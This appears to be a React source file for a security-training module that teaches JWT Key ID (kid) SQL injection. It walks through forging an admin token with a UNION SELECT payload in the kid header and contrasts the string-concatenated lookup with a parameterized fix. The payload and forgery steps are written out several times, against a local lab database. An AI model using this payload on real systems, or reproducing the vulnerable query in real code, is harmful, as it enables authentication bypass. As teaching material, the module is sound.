/**
 * Attack Module: Key ID (kid) SQL Injection
 * Demonstrates SQL injection via the kid header field when kid values are
 * concatenated directly into SQL queries for key lookup.
 */
import { useState } from 'react'
import { motion, AnimatePresence, useReducedMotion } from 'framer-motion'
import ModuleLayout from '../components/ModuleLayout'
import AttackVisualizer from '../components/AttackVisualizer'
import ExercisePanel from '../components/ExercisePanel'

const SQL_VULNERABLE = `SELECT secret FROM signing_keys WHERE kid = '<KID_VALUE>'`
const SQL_INJECTED   = `SELECT secret FROM signing_keys WHERE kid = 'anything' UNION SELECT 'pwnsecret' --'`
const SQL_PATCHED    = `SELECT secret FROM signing_keys WHERE kid = ?  -- parameterized`

const STEPS = [
  {
    title: 'Legitimate Login — kid Header Issued',
    client: 'POST /api/v1/attack/kid-sqli/login\n{"username":"user","password":"password"}',
    server: 'HTTP 200\n{\n  "token": "eyJhbGciOiJIUzI1NiIsImtpZCI6Im1haW4ta2V5In0...",\n  // header: {"alg":"HS256","kid":"main-key"}\n}',
    description: 'The server issues a token with a kid header ("main-key") pointing to the key in the SQLite signing_keys table. The kid is user-controlled in the token header.',
  },
  {
    title: 'Attacker Injects SQL via kid',
    client: 'Craft header:\n{"alg":"HS256","kid":"anything\' UNION SELECT \'pwnsecret\' --"}\n\nSign with HMAC key = "pwnsecret":\n  token = base64(header) + "." + base64(payload) + "." + HMAC("pwnsecret", ...)',
    server: 'Vulnerable SQL query:\n' + SQL_VULNERABLE + '\n\nWith injected kid:\n' + SQL_INJECTED,
    description: 'The attacker sets kid to a UNION SELECT injection. The server\'s vulnerable query returns "pwnsecret" as the signing key. The attacker signs their forged token with that same value.',
    highlight: true,
  },
  {
    title: 'UNION SELECT Returns Attacker\'s Key',
    client: 'SQL executes:\n' + SQL_INJECTED + '\n\nReturns: "pwnsecret"',
    server: 'Server looks up secret for kid:\n→ SQL returns "pwnsecret" (attacker-controlled!)\n\nServer verifies token with "pwnsecret":\n→ Signature matches!\n→ HTTP 200 {"valid":true,"role":"admin"}',
    description: 'The UNION SELECT clause injects a row not in the database. The server uses this attacker-controlled string as the verification key — and the attacker signed with the same string.',
    highlight: true,
  },
  {
    title: 'Patched: Parameterized Query',
    client: 'POST /api/v1/attack/kid-sqli/verify\n{"token": "<injected-kid-token>"}',
    server: 'Patched SQL:\n' + SQL_PATCHED + '\n\nkid literal treated as data, not SQL:\n→ No row found for "anything\' UNION..."\n→ HTTP 401 {"valid":false,"message":"No matching key found for kid."}',
    description: 'With a parameterized query, the kid value is passed as a parameter — never interpolated into SQL. The injection payload is treated as a literal string, finding no matching row.',
  },
]

const NARRATIVE = `
The JWT <code>kid</code> (Key ID) header claim tells the server which key to use for verification.
When the server looks up that key in a database using the raw kid value concatenated into SQL,
an attacker can mount a <span class="callout-term-danger">SQL injection</span> to control what key is returned.

The attack is elegant: the attacker also controls what key was used to sign the token.
By injecting a <span class="callout-term-danger">UNION SELECT</span> payload via the <code>kid</code> field, they make the server's
SQL query return <code>pwnsecret</code> as the verification key — and they've signed the token
with that exact string. Both sides of the verification match.

This attack requires:
<ul class="list-disc ml-4 mt-2 space-y-1">
  <li>A kid header field in the JWT (common in multi-key setups)</li>
  <li>The kid value is used directly in a SQL query (without <span class="callout-term">parameterization</span>)</li>
  <li>The attacker can determine or control what the SQL returns</li>
</ul>

The in-memory SQLite database here uses <code>:memory:</code> — no disk writes, no state
persistence between restarts.
`

const MITIGATION = `
**Fix:** Always use parameterized queries for kid lookup.

\`\`\`python
# Vulnerable
cursor.execute(f"SELECT secret FROM keys WHERE kid = '{kid}'")

# Patched — kid is a parameter, not interpolated
cursor.execute("SELECT secret FROM keys WHERE kid = ?", (kid,))
\`\`\`

**Additional hardening:**
- Validate kid format (e.g., alphanumeric only) before the database query
- Use an ORM that parameterizes queries by default
- Allowlist kid values against a known set rather than dynamic lookup
- Consider non-SQL key stores (in-memory dict, Redis) for simpler validation
`

/**
 * Animated side-by-side SQL query diff showing safe vs. injected query.
 * Highlights the injected portion with error color.
 */
function SqlQueryDiff() {
  const [showInjected, setShowInjected] = useState(false)
  const reduceMotion = useReducedMotion()

  return (
    <div className="mb-6">
      <div className="flex items-center justify-between mb-2">
        <h2 className="font-display text-h3 text-text-primary">SQL Query Diff</h2>
        <button
          onClick={() => setShowInjected(s => !s)}
          className="btn-secondary py-1 h-8 px-3 text-small"
          aria-label="Toggle between safe and injected query"
        >
          {showInjected ? 'Show Safe' : 'Show Injected'}
        </button>
      </div>
      <div className="grid grid-cols-2 gap-3">
        {/* Safe / parameterized query */}
        <div>
          <div className="text-small text-primary mb-1 font-medium">✓ Safe — Parameterized</div>
          <div className="code-block text-xs font-mono whitespace-pre-wrap text-text-muted">
            {SQL_PATCHED}
          </div>
        </div>
        {/* Injected / vulnerable query */}
        <div>
          <div className="text-small text-error mb-1 font-medium">✗ Vulnerable — String Concat</div>
          <AnimatePresence mode="wait">
            {showInjected ? (
              <motion.div
                key="injected"
                initial={{ opacity: 0, x: reduceMotion ? 0 : 8 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: reduceMotion ? 0 : -8 }}
                transition={{ duration: reduceMotion ? 0 : 0.22 }}
                className="code-block text-xs font-mono whitespace-pre-wrap"
              >
                <span className="text-text-muted">SELECT secret FROM signing_keys WHERE kid = </span>
                <span className="bg-error/20 text-error border border-error/30 rounded px-0.5">
                  {`'anything' UNION SELECT 'pwnsecret' --'`}
                </span>
              </motion.div>
            ) : (
              <motion.div
                key="vulnerable"
                initial={{ opacity: 0, x: reduceMotion ? 0 : 8 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: reduceMotion ? 0 : -8 }}
                transition={{ duration: reduceMotion ? 0 : 0.22 }}
                className="code-block text-xs font-mono whitespace-pre-wrap text-text-muted"
              >
                {SQL_VULNERABLE}
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  )
}

export default function KidSqliModule() {
  return (
    <ModuleLayout
      slug="kid-sqli"
      title="Key ID SQL Injection"
      severity="Critical"
      cve={null}
      narrative={NARRATIVE}
      mitigation={MITIGATION}
    >
      <AttackVisualizer steps={STEPS} />

      {/* Animated SQL diff component */}
      <SqlQueryDiff />

      <ExercisePanel
        slug="kid-sqli"
        description="The kid header is pre-set to the SQL injection payload. The Forge secret is pre-loaded with 'pwnsecret'. Click ⚡ Fire Token — the vulnerable endpoint runs the UNION SELECT, retrieves 'pwnsecret' as the signing key, and accepts the token. Toggle Patch to see it rejected."
        extraHeaderFields={{ kid: "' UNION SELECT 'pwnsecret'--" }}
        initialSecret="pwnsecret"
      />
    </ModuleLayout>
  )
}
